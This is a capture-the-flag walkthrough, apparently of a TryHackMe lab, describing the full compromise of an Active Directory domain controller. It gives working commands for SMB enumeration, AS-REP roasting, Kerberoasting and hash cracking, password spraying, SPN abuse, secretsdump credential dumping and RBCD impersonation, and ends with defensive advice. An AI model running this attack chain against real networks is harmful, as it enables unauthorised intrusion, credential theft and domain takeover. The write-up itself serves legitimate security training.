Operation Endgame – Active Directory Exploitation Walkthrough
=================

Network Reconnaissance
-------------------------
Initial Scan: Began with a full TCP SYN scan 
```
nmap -sS -p- TARGET_IP).
```
Ping was blocked due to AD environment restrictions.

Adjusted Scan: Switched to TCP Connect scan with no ping 
```
nmap -sT -Pn -p- TARGET_IP
```
This revealed multiple open ports, including DNS (53), HTTP/HTTPS (80/443), Kerberos (88), LDAP (389/636), SMB (445), RDP (3389), and WinRM (47001).

Focused Scope: Concentrated on critical AD-related services for deeper enumeration.

Service Fingerprinting
-------------------------
Conducted version and script scans (nmap -sC -sV) on selected ports.
```
nmap -sT -sC -sV -Pn -p 53,80,88,135,139,389,443,445,636,3389,47001 TARGET_IP -oN service.txt
```
Identified Microsoft IIS web server, Kerberos, LDAP tied to domain thm.local, SMB with enforced signing, and RDP with NTLM info leakage.
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-24 05:21 UTC
Nmap scan report for ip-10-129-146-222.eu-west-3.compute.internal (TARGET_IP)
Host is up (0.00066s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-24 05:21:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn:
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-05-12T07:26:00
|_Not valid after:  2028-05-12T07:35:59
|_http-title: IIS Windows Server
|_ssl-date: 2026-07-24T05:21:49+00:00; 0s from scanner time.
| http-methods:
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ad.thm.local
| Not valid before: 2026-07-23T05:14:40
|_Not valid after:  2027-01-22T05:14:40
|_ssl-date: 2026-07-24T05:21:49+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: AD
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: ad.thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-24T05:21:40+00:00
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: AD; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-24T05:21:41
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.63 seconds
```
This confirmed the target as a Windows AD domain controller.

SMB Enumeration
------------------
Tested anonymous login with nxc smb using guest credentials.
```
nxc smb TARGET_IP -u 'guest' -p '
```
Successfully accessed shares and enumerated users via RID cycling.
```
nxc smb TARGET_IP -u 'guest' -p ' --shares
nxc smb TARGET_IP -u 'guest' -p '' --rid | grep -i sidtypeuser > userslist.txt
```
<img width="935" height="277" alt="endgame_1_smb_shares" src="https://github.com/user-attachments/assets/ea1b21f7-4b21-467d-a72c-34f47522f4e3" />

<img width="881" height="221" alt="endgame_1_ldap_users" src="https://github.com/user-attachments/assets/73f7499c-1dde-4cfd-a1c3-1ba2bc18c75a" />

Extracted usernames into a clean list for further attacks.
```
cat userslist.txt | cut -d '\' -f2 | awk '{print $1}' > usernames.txt
```

AS-REP Roasting
------------------
Configured /etc/hosts to resolve AD domain names.
```
nxc smb TARGET_IP -u 'guest' -p '' --generate-hosts-file hosts
echo "TARGET_IP     AD.thm.local thm.local AD" >> /etc/hosts
```
Used GetNPUsers.py to identify accounts with pre-authentication disabled.
```
GetNPUsers.py thm.local/ -dc-ip TARGET_IP -usersfile usernames.txt -format hashcat -outputfile hashes.txt -no-pass
```
<img width="946" height="253" alt="endgame_1_AS_RES" src="https://github.com/user-attachments/assets/f25537d8-5015-4905-b817-336f39163b96" />

Retrieved AS-REP hashes, attempted but not crack
```
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Kerberoasting
----------------
Queried service accounts with GetUserSPNs.py.

Obtained TGS tickets for cody_roy.
```
GetUserSPNs.py thm.local/guest -dc-ip ad.thm.local -request -no-pass
```
Cracked the hash with Hashcat, yielding valid credentials.
```
hashcat -m 13100 hash1.txt /usr/share/wordlists/rockyou.txt
```
<img width="533" height="329" alt="endgame_1_kerberoasting_hash_crack" src="https://github.com/user-attachments/assets/b3750e06-75dc-4dbd-a130-268518344fce" />

cody_user shares
```
nxc smb ad.thm.local -u cody_roy -p "redacted" --shares
```
<img width="937" height="192" alt="endgame_2_user_login_share" src="https://github.com/user-attachments/assets/029656e4-81da-4aa8-86a8-38db1dff2e6f" />

Verified access via SMB and attempted RDP/WinRM logins.
```
xfreerdp /v:ad.thm.local /u:'thm.local\cody_roy' /p:'redacted'
```
<img width="655" height="358" alt="endgame_2_user_rdp_login_error" src="https://github.com/user-attachments/assets/3c99b641-9a04-4fb6-83aa-293da8afc9a1" />

Password Spraying
--------------------
Sprayed cracked password across enumerated users.
```
nxc smb thm.local -u usernames.txt -p "redacted" --continue-on-success | grep [+]
```
Discovered additional valid accounts (zachary_hunt).

Expanded foothold within the domain.

BloodHound Enumeration
-------------------------
Executed bloodhound-python to map AD relationships.
```
bloodhound-python -u cody_roy -p "redacted" -d thm.local -ns TARGET_IP -c All --zip
```
result
```
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: thm.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: ad.thm.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: ad.thm.local
INFO: Found 490 users
INFO: Found 53 groups
INFO: Found 4 gpos
INFO: Found 216 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: ad.thm.local
INFO: Done in 00M 08S
INFO: Compressing output into 20260724115957_bloodhound.zip
```
Found cody_roy as a Tier 2 admin and zachary_hunt with GenericWrite privileges over another user.

<img width="901" height="312" alt="endgame_3_cody_tier2_user" src="https://github.com/user-attachments/assets/0a8884cb-3c3f-4d42-925a-dc0c22ddb312" />

Leveraged privilege escalation paths.

Targeted Kerberoasting & Privilege Escalation
------------------------------------------------
We can update any non-protected parameters of our target object. This could allow us to, for example, update the SPN parameter, so DC will consider Domain Account as service acccount.

<img width="842" height="336" alt="endgame_3_zachary_user_genericwrite" src="https://github.com/user-attachments/assets/12dd2079-53a7-4d80-ac43-cd5766984e32" />

Modified SPNs using bloodyAD with GenericWrite.
```
bloodyAD -u zachary_hunt -p "redacted" -d thm.local --host TARGET_IP set object JERRI_LANCASTER servicePrincipalName -v 'http/fake.thm.local'
[+] JERRI_LANCASTER's servicePrincipalName has been updated
```
Retrieved and cracked TGS tickets for jerri_lancaster.
```
GetUserSPNs.py thm.local/zachary_hunt:'redacted' -dc-ip TARGET_IP -request-user JERRI_LANCASTER -output hash2.txt
hashcat -m 13100 hash2.txt /usr/share/wordlists/rockyou.txt 
```
<img width="544" height="329" alt="endgame_3_jerri_user_hash_crack" src="https://github.com/user-attachments/assets/9d599a69-0a97-48f1-a1c4-6a1fc76c91c4" />

Logged in via RDP, harvested credentials for sanford_daugherty.

<img width="424" height="326" alt="endgame_3_jerri_rdp_login" src="https://github.com/user-attachments/assets/d56d8c1a-ab69-4b80-a001-0903ae3a3c88" />

Identified sanford_daugherty as a Domain Admin.

<img width="419" height="304" alt="endgame_4_sanford_user_cred" src="https://github.com/user-attachments/assets/4e53c43e-6c19-4496-a3df-eaf0d28d8711" />

<img width="767" height="346" alt="endgame_4_sanford_domain_admin" src="https://github.com/user-attachments/assets/10f7a8d8-e0e2-4fce-b125-65a72aba7425" />

Achieved full administrative privileges.
```
nxc smb thm.local -u 'sanford_daugherty' -p 'Redacted' --shares
```
<img width="925" height="184" alt="endgame_4_sanford_user_shares" src="https://github.com/user-attachments/assets/b6537234-f96b-43ee-ac6c-a6cc161afc34" />

Credential Harvesting
------------------------
Dumped secrets with secretsdump.py.
```
smbclient.py thm.local/sanford_daugherty:'Redacted'@thm.local
```
<img width="551" height="305" alt="endgame_5_admin_flag" src="https://github.com/user-attachments/assets/3dedea94-b77b-4e01-b8f3-20ac35e34bad" />

Extracted domain credentials and flags, confirming complete compromise.
```
secretsdump.py thm.local/sanford_daugherty:'redacted'@ad.thm.local -just-dc
```
<img width="548" height="230" alt="endgame_5_creds_dump" src="https://github.com/user-attachments/assets/142aaad6-bf60-40ac-a1a9-1170d0f59694" />


Explored Resource-Based Constrained Delegation (RBCD) for persistence and further exploitation.
```
rbcd.py THM.LOCAL/guest -no-pass -dc-ip TARGET_IP -delegate-to AD$ -delegate-from CODY_ROY -action write -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
getST.py -impersonate "Administrator" -spn "cifs/ad.thm.local" -k -no-pass 'THM.LOCAL/CODY_ROY:redacted'
```



Defensive Approach & Lessons Learned
------------------------------------
To protect against the techniques demonstrated in this challenge, organizations should implement the following defensive measures:
- Restrict Anonymous Access: Disable guest/anonymous SMB logins and enforce strong authentication.
- Kerberos Hardening: Ensure pre-authentication is enabled for all accounts; monitor for unusual SPN requests.
- Password Policy: Enforce strong, unique passwords and account lockout policies to mitigate spraying and brute force.
- Service Account Security: Limit privileges of service accounts; avoid assigning Domain Admin rights unnecessarily.
- Monitoring & Detection: Deploy SIEM solutions to detect suspicious LDAP queries, BloodHound-like enumeration, and privilege escalation attempts.
- Patch & Harden: Regularly update domain controllers, disable risky protocols, and enforce SMB signing.
- Least Privilege Principle: Continuously review group memberships and remove excessive privileges.
- RBCD Mitigation: Audit delegation rights and restrict resource-based constrained delegation to trusted services only.
